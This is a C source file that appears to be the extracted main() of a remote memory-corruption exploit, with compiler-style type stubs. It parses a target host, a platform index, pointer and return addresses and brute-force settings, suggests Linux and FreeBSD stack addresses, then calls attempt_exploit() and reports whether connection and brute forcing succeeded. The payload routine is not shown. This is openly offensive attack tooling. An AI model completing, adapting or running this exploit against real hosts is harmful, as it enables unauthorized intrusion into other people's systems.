
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* platform; } ;






 int SIZ ;


 int atoi (int ) ;
 int attempt_exploit () ;
 void* exactPointerAddy ;
 int exit (int ) ;
 int * gethostbyname (char*) ;
 int getopt (int,char**,char*) ;
 char* host ;
 int * hostStruct ;
 int optarg ;
 int printf (char*,...) ;
 void* retAddr ;
 int strncpy (char*,int ,int ) ;
 void* strtoul (int ,int *,int) ;
 TYPE_1__* targets ;
 char* usage ;
 int useTarget ;

main(int argc, char **argv) {
        int ch, i;

        while((ch=getopt(argc, argv, "t:T:e:hr:"))!=-1) {
                switch(ch) {
                        case 't':
                                strncpy(host, optarg, SIZ-1);
                                break;
                        case 'T':
                                useTarget=atoi(optarg);
                                break;
                        case 'e':
                                exactPointerAddy=strtoul(optarg,((void*)0),16);
                                break;
                        case 'r':
                                retAddr=strtoul(optarg,((void*)0),16);
                                break;
                        case 'h':
                        default:
                                printf("%s\n",usage);
                                printf("Available platforms:\n");
                                for(i=0;targets[i].platform;i++)
                                        printf("%2d. %s\n", i, targets[i].platform);
                                printf("\n");
                                exit(0);
                                break;
                }
        }


        if(!retAddr && exactPointerAddy) {
                printf("[*] You must give RET address when specifying a pointer address\n");
                printf("    A good place to start is 0xbfffe0b0(linux) or 0xbfbfe0b0(freeBSD)\n");
  printf("    Also remember to pass a -T x flag... things will be unpredictable\n");
  printf("    if you don't!\n");
                exit(0);
        }

        if((hostStruct=gethostbyname(host))==((void*)0)) {
               printf("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[0]);
                exit(0);
        }

        switch(attempt_exploit()) {
                case 131:
                        printf("[*] Couldn't connect to host: %s not found.\n", host);
                        break;
                case 129:
                        printf("[*] Couldn't grab a socket!\n");
                        break;
                case 132:
                        printf("[*] Connection to %s was rejected\n",host);
                        break;
                case 130:
                        printf("[*] This attempt failed ...\n");
                        break;
                case 133:
                        printf("[*] Bruteforce failed.\n");
                        break;
                case 128:
                        break;
                default:
                        printf("[*] ERROR: There was no error!\n");
                        break;
        }

        printf("\nHave a nice day!\n");
        exit(0);
}
